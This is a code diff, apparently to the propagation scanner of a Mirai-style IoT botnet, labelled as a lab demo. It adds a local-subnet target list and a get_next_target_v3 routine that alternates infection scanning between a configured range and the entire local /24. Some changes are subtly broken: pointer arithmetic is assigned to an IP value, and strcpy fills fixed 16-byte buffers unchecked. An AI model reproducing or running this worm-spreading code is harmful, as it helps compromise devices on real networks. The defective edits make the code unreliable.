@@ -103,20 +103,27 @@ ipv4_t convert_ip(const char *ip) { //check whether the IP is valid or not
 static ipv4_t g_target_ips[100] = {0};
 int g_target_ips_num = 0;
 
-void target_ip_init(void)
+static ipv4_t g_local_ips[255] = {0};
+int g_local_ips_num = 0;
+
+void target_ip_init(const char* csz_ip_begin, const char* csz_ip_end, 
+                    ipv4_t* target_ips, int target_ips_size, 
+                    int* p_target_ips_num)
 {
-    char sz_addrbuff_cur[16] = "{ip_prx}.{tgt_bgn}";
-    char sz_addrbuff_end[16] = "{ip_prx}.{tgt_end}";
+    char sz_addrbuff_cur[16];
+    char sz_addrbuff_end[16];
+    strcpy(sz_addrbuff_cur, csz_ip_begin);
+    strcpy(sz_addrbuff_end, csz_ip_end);
     ipv4_t ip_cur = convert_ip(sz_addrbuff_cur);
     ipv4_t ip_end = convert_ip(sz_addrbuff_end);
 
 #ifdef DEBUG
     printf("[scanner] target_ip_init..\n");
 #endif
-    for(int i=0; i<sizeof(g_target_ips)/sizeof(ipv4_t); i++)
+    for(int i=0; i<target_ips_size; i++)
     {
-        g_target_ips[i] = ip_cur;
-        g_target_ips_num++;
+        *(target_ips+i) = ip_cur;
+        (*p_target_ips_num)++;
 #ifdef DEBUG
         printf("  %d.%d.%d.%d\n", ip_cur & 0xff, (ip_cur >> 8) & 0xff, (ip_cur >> 16) & 0xff, (ip_cur >> 24) & 0xff);
 #endif
@@ -136,14 +143,52 @@ ipv4_t get_next_target_v2(void) // for lab demo version
     if(local_addr != ip_bgn)
         return 0;
 
-    ipv4_t next_addr = g_target_ips[rand_next() % g_target_ips_num];
+    ipv4_t next_addr = g_target_ips+(rand_next() % g_target_ips_num);
     while(next_addr == local_addr)
     {
-        next_addr = g_target_ips[rand_next() % g_target_ips_num];
+        next_addr = g_target_ips+(rand_next() % g_target_ips_num);
     }
 
 #ifdef DEBUG
     printf("[scanner] next_addr %d.%d.%d.%d\n", next_addr & 0xff, (next_addr >> 8) & 0xff, (next_addr >> 16) & 0xff, (next_addr >> 24) & 0xff);
+#endif
+    return next_addr;
+}
+
+static int g_count = 0;
+
+ipv4_t get_next_target_v3(void) // for lab demo version
+{   
+    char sz_addrbuff_bgn[16] = "{ip_prx}.{tgt_bgn}";
+    ipv4_t ip_bgn = convert_ip(sz_addrbuff_bgn);
+
+    // only the first IoT device attack
+    ipv4_t local_addr = util_local_addr();
+    if(local_addr != ip_bgn)
+        return 0;
+
+    g_count++;
+    ipv4_t next_addr;
+
+    if(g_count%2==0)
+    {
+        next_addr = g_target_ips[rand_next() % g_target_ips_num];
+        while(next_addr == local_addr)
+        {
+            next_addr = g_target_ips[rand_next() % g_target_ips_num];
+        }
+    }
+    else
+    {
+        next_addr = g_local_ips[rand_next() % g_local_ips_num];
+        while(next_addr == local_addr)
+        {
+            next_addr = g_local_ips[rand_next() % g_local_ips_num];
+        }
+    }
+
+#ifdef DEBUG
+    printf("[scanner] [%d] next_addr %d.%d.%d.%d\n", g_count, next_addr & 0xff, (next_addr >> 8) & 0xff, (next_addr >> 16) & 0xff, (next_addr >> 24) & 0xff);
 #endif
     return next_addr;
 }
@@ -312,7 +357,8 @@ void scanner_init(void)
     printf("[scanner] Scanner process initialized. Scanning started.\n");
 #endif
 
-    target_ip_init();
+    target_ip_init("{ip_prx}.{tgt_bgn}", "{ip_prx}.{tgt_end}", g_target_ips, sizeof(g_target_ips)/sizeof(ipv4_t), &g_target_ips_num);
+    target_ip_init("{ip_prx}.1", "{ip_prx}.255", g_local_ips, sizeof(g_local_ips)/sizeof(ipv4_t), &g_local_ips_num);
 
     // Main logic loop
     while (TRUE)
@@ -337,7 +383,7 @@ void scanner_init(void)
                 iph->id = rand_next();
                 iph->saddr = LOCAL_ADDR;
 // #ifdef DEBUG
-                next_addr = get_next_target_v2();
+                next_addr = get_next_target_v3();
                 if(next_addr != 0)
                 {
                     iph->daddr = next_addr;
